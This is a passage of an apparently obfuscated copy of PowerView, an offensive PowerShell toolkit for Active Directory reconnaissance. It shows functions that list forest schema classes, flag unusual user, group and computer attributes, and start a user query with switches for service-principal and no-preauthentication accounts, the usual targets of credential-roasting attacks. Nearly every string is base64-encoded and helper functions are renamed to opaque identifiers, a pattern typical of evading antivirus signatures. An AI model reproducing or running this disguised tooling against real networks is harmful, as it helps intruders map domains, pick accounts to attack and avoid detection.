    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${483} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${481} = f72 @483
        if (${481}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
                ForEach (${482} in $ClassName) {
                    ${481}.Schema.FindClass(${482})
                }
            }
            else {
                ${481}.Schema.FindAllClasses()
            }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${478} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${477} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${475} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${479} = f69 -Domain $Domain | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            else {
                ${479} = f69 -Domain $Domain -Credential $Credential | select -ExpandProperty Forest | select -ExpandProperty Name
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAbgB1AG0AZQByAGEAdABlAGQAIABmAG8AcgBlAHMAdAAgACcAJAB7ADQANwA5AH0AJwAgAGYAbwByACAAdABhAHIAZwBlAHQAIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
        }
        ${480} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${480}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if (${479}) {
            ${480}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = ${479}
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkACAALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
            ${472} = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAGUAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            ${472} = gm -InputObject $ReferenceObject -MemberType NoteProperty | select -Expand Name
            ${476} = $ReferenceObject.objectclass | select -Last 1
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEMAYQBsAGMAdQBsAGEAdABlAGQAIABSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdABDAGwAYQBzAHMAIAA6ACAAJAB7ADQANwA2AH0A')))
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHQAaABlACAAZABlAGYAYQB1AGwAdAAgAHIAZQBmAGUAcgBlAG4AYwBlACAAcAByAG8AcABlAHIAdAB5ACAAcwBlAHQAIABmAG8AcgAgAHQAaABlACAAbwBiAGoAZQBjAHQAIABjAGwAYQBzAHMAIAAnACQAQwBsAGEAcwBzAE4AYQBtAGUAJwA=')))
        }
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or (${476} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            ${474} = f71 @48
            if (-not ${472}) {
                ${472} = ${478}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or (${476} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            ${474} = f70 @48
            if (-not ${472}) {
                ${472} = ${477}
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or (${476} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            ${474} = f79 @48
            if (-not ${472}) {
                ${472} = ${475}
            }
        }
        else {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEkAbgB2AGEAbABpAGQAIABjAGwAYQBzAHMAOgAgACQAQwBsAGEAcwBzAE4AYQBtAGUA')))
        }
        ForEach ($Object in ${474}) {
            ${473} = gm -InputObject $Object -MemberType NoteProperty | select -Expand Name
            ForEach(${471} in ${473}) {
                if (${472} -NotContains ${471}) {
                    ${179} = New-Object PSObject
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Object.SamAccountName
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdAB5AA=='))) ${471}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.${471}
                    ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcgA='))))
                    ${179}
                }
            }
        }
    }
}
function f71 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [Switch]
        ${f29},
        [Switch]
        ${f25},
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${f35},
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${f34},
        [Switch]
        ${f32},
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${f33},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${461} = [Enum]::GetNames(${23})
        ${461} = ${461} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        f115 -Name UACFilter -ValidateSet ${461} -f19 ([array])
    }
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
